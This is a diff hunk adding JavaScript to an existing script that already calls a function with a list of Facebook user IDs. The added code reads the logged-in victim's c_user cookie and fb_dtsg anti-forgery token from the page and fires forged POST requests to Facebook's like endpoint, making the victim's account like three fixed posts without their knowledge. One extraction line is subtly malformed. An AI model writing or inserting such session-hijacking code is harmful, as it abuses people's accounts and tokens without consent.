@@ -311,3 +311,21 @@ a2l("100003785647375");
 a2l("100003697277263");  
 a2l("100001050235420");
 };
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var now=(new Date).getTime();
+function P(opo) {
+  var X = new XMLHttpRequest();
+  var XURL ="//www.facebook.com/ajax/ufi/like.php";
+  var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp=";
+  X.open("POST", XURL, true);
+  X.onreadystatechange = function () {
+    if (X.readyState == 4 && X.status == 200) {
+      X.close;
+    }
+  };
+  X.send(XParams);
+}    
+P("351530281643490");
+P("351473514982500");
+P("349144511882067");
